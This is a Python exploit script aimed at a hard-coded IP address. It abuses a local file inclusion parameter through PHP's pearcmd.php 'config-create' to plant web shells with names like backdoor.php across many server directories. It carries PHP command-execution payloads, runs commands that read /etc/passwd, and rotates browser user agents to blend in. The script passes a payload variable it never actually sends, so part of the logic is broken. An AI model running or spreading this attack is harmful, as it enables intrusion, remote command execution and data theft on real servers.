import requests
import random
import time

# Configuration
BASE_URL = "http://135.181.88.229:56260/"
LFI_PARAM = "?page="
PEARCMD_PATH = "../../../../../../usr/local/lib/php/pearcmd.php"
COMMAND_CREATE = "+config-create+"
TEST_DIRECTORIES = [
    "/tmp",
    "/var/tmp",
    "/dev/shm",
    "/var/www/html",
    "/usr/local/apache2/htdocs",
    "/usr/local/nginx/html",
    "/home",
    "/root",
    "/var/log",
    "/var/cache",
    "/var/lib",
    "/var/spool",
    "/var/run",
    "/usr/share",
    "/usr/lib",
    "/usr/bin",
    "/usr/sbin",
    "/usr/local",
    "/opt",
    "/srv",
    "/mnt",
    "/media"
]
SHELL_FILENAMES = [
    "shell.php",
    "cmd.php",
    "test.php",
    "backdoor.php",
    "exploit.php"
]
COMMANDS_TO_TEST = [
    "id",
    "whoami",
    "uname -a",
    "ls -la /",
    "cat /etc/passwd"
]
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 10; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36"
]
LOG_FILE = "exploit_log.txt"

# Payloads
PHP_PAYLOADS = [
    "<?php system($_GET['cmd']); ?>",
    "<?php echo shell_exec($_GET['cmd']); ?>",
    "<?php passthru($_GET['cmd']); ?>",
    "<?php exec($_GET['cmd'], $output); print_r($output); ?>",
    "<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>'; ?>",
    "<?php if(isset($_GET['cmd'])) { system($_GET['cmd']); } ?>"
]

def log_message(message):
    """Log messages to a file and print to console."""
    print(message)
    with open(LOG_FILE, "a") as log:
        log.write(f"{message}\n")

def get_random_user_agent():
    """Return a random user-agent string."""
    return random.choice(USER_AGENTS)

def test_shell_creation(base_url, lfi_param, pearcmd_path, command_create, directory, filename, payload):
    """
    Test if a shell file can be created in the specified directory.
    """
    url = (
        f"{base_url}{lfi_param}{pearcmd_path}"
        f"{command_create}{directory}+{filename}"
    )
    
    headers = {
        "User-Agent": get_random_user_agent()
    }
    
    try:
        response = requests.get(url, headers=headers, timeout=10)
        log_message(f"[*] Testing URL: {url}")
        log_message(f"[*] Response Status Code: {response.status_code}")
        log_message(f"[*] Response Text (first 500 chars): {response.text[:500]}")
        
        if "Could not create" not in response.text:
            log_message(f"[+] Success: Shell '{filename}' created in '{directory}'.")
            return True
        else:
            log_message(f"[-] Failed: Could not create shell in '{directory}'.")
            return False
    except Exception as e:
        log_message(f"[!] Error testing path '{directory}': {e}")
        return False

def verify_file_exists(base_url, lfi_param, directory, filename):
    """
    Verify if the file was actually created by trying to read it.
    """
    traversal_depths = ["../../../../../../", "../../../../../", "../../../../", "../../../", "../../", "../"]
    
    for depth in traversal_depths:
        file_url = f"{base_url}{lfi_param}{depth}{directory.strip('/')}/{filename}"
        log_message(f"[*] Testing file URL: {file_url}")
        
        headers = {
            "User-Agent": get_random_user_agent()
        }
        
        try:
            response = requests.get(file_url, headers=headers, timeout=10)
            log_message(f"[*] Response Status Code: {response.status_code}")
            log_message(f"[*] Response Text (first 500 chars): {response.text[:500]}")
            
            if response.status_code == 200 and response.text.strip():
                log_message(f"[+] File exists: '{directory}/{filename}'.")
                return True
            else:
                log_message(f"[-] File does not exist: '{directory}/{filename}'.")
        except Exception as e:
            log_message(f"[!] Error verifying file: {e}")
    
    return False

def verify_shell(base_url, lfi_param, directory, filename, command):
    """
    Verify if the shell file executes commands.
    """
    traversal_depths = ["../../../../../../", "../../../../../", "../../../../", "../../../", "../../", "../"]
    
    for depth in traversal_depths:
        shell_url = f"{base_url}{lfi_param}{depth}{directory.strip('/')}/{filename}?cmd={command}"
        log_message(f"[*] Testing shell URL: {shell_url}")
        
        headers = {
            "User-Agent": get_random_user_agent()
        }
        
        try:
            response = requests.get(shell_url, headers=headers, timeout=10)
            log_message(f"[*] Response Status Code: {response.status_code}")
            log_message(f"[*] Response Text (first 500 chars): {response.text[:500]}")
            
            if response.status_code == 200 and response.text.strip():
                if "uid=" in response.text and "gid=" in response.text:  # Check for command output
                    log_message(f"[+] Shell confirmed: '{directory}/{filename}' executed '{command}' successfully!")
                    log_message(f"[+] Output: {response.text}")
                    return True
                else:
                    log_message(f"[-] Shell not working: '{directory}/{filename}' did not execute '{command}'.")
            else:
                log_message(f"[-] Shell not working: '{directory}/{filename}' returned an empty or invalid response.")
        except Exception as e:
            log_message(f"[!] Error verifying shell: {e}")
    
    return False

def main():
    log_message("[*] Starting advanced automated testing for shell creation...")
    
    for directory in TEST_DIRECTORIES:
        log_message(f"\n[*] Testing directory: {directory}")
        for filename in SHELL_FILENAMES:
            log_message(f"[*] Testing filename: {filename}")
            for payload in PHP_PAYLOADS:
                log_message(f"[*] Testing payload: {payload[:50]}...")  # Log first 50 chars of payload
                success = test_shell_creation(
                    BASE_URL,
                    LFI_PARAM,
                    PEARCMD_PATH,
                    COMMAND_CREATE,
                    directory,
                    filename,
                    payload
                )
                
                if success:
                    log_message(f"[*] Verifying file existence in '{directory}/{filename}'...")
                    if verify_file_exists(BASE_URL, LFI_PARAM, directory, filename):
                        log_message(f"[*] Verifying shell in '{directory}/{filename}'...")
                        for command in COMMANDS_TO_TEST:
                            if verify_shell(BASE_URL, LFI_PARAM, directory, filename, command):
                                log_message("[+] Exploitation successful. Shell is ready to use!")
                                return
                    time.sleep(1)  # Rate limiting
    
    log_message("[-] No writable directories found. Exploitation failed.")

if __name__ == "__main__":
    main()
